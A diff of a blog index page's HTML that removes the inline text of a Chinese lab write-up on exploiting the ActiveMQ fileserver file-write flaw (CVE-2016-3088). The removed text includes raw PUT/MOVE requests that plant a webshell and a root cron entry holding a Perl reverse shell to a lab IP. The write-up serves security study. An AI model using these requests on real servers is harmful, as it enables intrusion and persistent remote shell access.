@@ -538,55 +538,15 @@
 
       
         
-          
-            <h1 id="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><a href="#ActiveMQ任意文件写入漏洞（CVE-2016-3088）" class="headerlink" title="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"></a>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</h1><p>环境侦听端口61616和端口8161，其中8161是Web控制台端口。此漏洞显示在Web控制台中。</p>
+          <h1 id="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><a href="#ActiveMQ任意文件写入漏洞（CVE-2016-3088）" class="headerlink" title="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"></a>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</h1><p>环境侦听端口61616和端口8161，其中8161是Web控制台端口。此漏洞显示在Web控制台中。</p>
 <p>请访问<code>http://192.168.44.132:8161/</code>以查看该网页，指示该环境已成功运行。</p>
-<h2 id="背景简介"><a href="#背景简介" class="headerlink" title="背景简介"></a>背景简介</h2><p>ActiveMQ Web控制台分为三个应用程序：admin，api和文件服务器，其中admin是管理员页面，api是界面，fileserver是用于存储文件的界面；admin和api需要先登录才能使用，fileserver不需要登录。</p>
-<p>文件服务器是RESTful API接口。我们可以通过HTTP请求（例如GET，PUT和DELETE）读写存储在其中的文件。设计目的是为了弥补消息队列操作无法传输和存储二进制文件但后来发现的缺陷：</p>
-<ol>
-<li>使用率不高</li>
-<li>文件操作容易产生漏洞</li>
-</ol>
-<p>因此，ActiveMQ默认在5.12.x〜5.13.x中关闭文件服务器应用程序（您可以在conf/jetty.xml中打开它）。在5.14.0之后，文件服务器应用程序将被完全删除。</p>
-<p>在测试过程中，您应注意ActiveMQ的版本，以防浪费精力。</p>
-<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>此漏洞出现在Fileserver应用程序中，该漏洞的原理实际上非常简单，即文件服务器支持写入文件（但不解析JSP），同时支持移动文件（MOVE请求）。因此，我们只需要编写一个文件，然后通过使用移动请求将其移动到任何位置，就会导致任意文件写入漏洞。</p>
-<p>写入文件，例如cron或ssh key</p>
-<ol>
-<li>编写Webshell</li>
-<li>写入文件，例如cron或ssh key</li>
-<li>编写库和配置文件，例如jar或jetty.xml</li>
-</ol>
-<p>编写webshell的优点是方便，但是文件服务器不需要解析jsp，admin和api都需要登录才能访问，因此有点徒劳。编写cron或ssh键的优点是直接反转Shell，这也很方便，缺点是您需要root权限；写jar，有点麻烦（需要jar后门），写xml配置文件，这种方法比较可靠，但是有一点徒劳：我们需要知道ActiveMQ的绝对路径。</p>
-<p>让我们谈谈以上几种方法。</p>
-<h3 id="编写Webshell"><a href="#编写Webshell" class="headerlink" title="编写Webshell"></a>编写Webshell</h3><p>如前所述，Webshell需要使用Admin或Api应用程序编写，并且两个应用程序都需要登录才能访问。</p>
-<p>默认的ActiveMQ帐户和密码为<code>admin</code>。首先，访问<code>http://192.168.44.132:8161/admin/test/systemProperties.jsp</code>以查看ActiveMQ的绝对路径：</p>
-<p><img src="https://image.3001.net/images/20210428/16195940351464.png" alt="image-20210427095240778"></p>
-<p>然后上传Webshell：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;2.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 120976</span><br><span class="line"></span><br><span class="line">webshell...</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://image.3001.net/images/20210428/16195940392700.png" alt="image-20210427104033538"></p>
-<p>然后将其移至<code>/opt/activemq/webapps/api/s.jsp</code>Web目录中的API文件夹（）：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;2.txt HTTP&#x2F;1.1</span><br><span class="line">Destination: file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;s.jsp</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://image.3001.net/images/20210428/16195940433285.png" alt="image-20210427114856845"></p>
-<p>访问Webshell（需要登录）：</p>
-<p><img src="https://image.3001.net/images/20210428/16195940469706.png" alt="image-20210427114944287"></p>
-<h3 id="编写crontab，自动执行反向shell"><a href="#编写crontab，自动执行反向shell" class="headerlink" title="编写crontab，自动执行反向shell"></a>编写crontab，自动执行反向shell</h3><p>这是一个相对稳定的方法。首先上传cron配置文件（请注意，换行符必须是<code>\n</code>，而不是<code>\r\n</code>，否则crontab执行将失败），这里使用新版的burp，可以清楚看到\n与\r：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 192.618.44.132:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 250</span><br><span class="line">\n</span><br><span class="line">*&#x2F;1 * * * * root &#x2F;usr&#x2F;bin&#x2F;perl -e &#39;use Socket;$i&#x3D;&quot;192.168.44.132&quot;;$p&#x3D;4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;\n</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://image.3001.net/images/20210428/16195940493714.png" alt="image-20210427201525273"></p>
-<p>将其移至<code>/etc/cron.d/root</code>：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Destination: file:&#x2F;&#x2F;&#x2F;etc&#x2F;cron.d&#x2F;root</span><br><span class="line">Host: 192.168.44.132:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br><span class="line">\n</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://image.3001.net/images/20210428/16195940534404.png" alt="image-20210427201602124"></p>
-<p>如果以上两个请求都返回204，则写入成功。等待反向shell：</p>
-<p><img src="https://image.3001.net/images/20210428/16195940562451.png" alt="image-20210427201645034"></p>
-<p>此方法要求ActiveMQ以root身份运行，否则它将无法写入cron文件。</p>
-<h3 id="编写jetty-xml或jar"><a href="#编写jetty-xml或jar" class="headerlink" title="编写jetty.xml或jar"></a>编写jetty.xml或jar</h3><p>从理论上讲，我们可以覆盖jetty.xml，删除admin和api的登录限制，然后编写webshell。</p>
-<p>在某些情况下，jetty.xml和jar的所有者是Web容器的用户，因此编写crontab的成功率更高。</p>
-<p>尚未测试。</p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2021/04/28/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
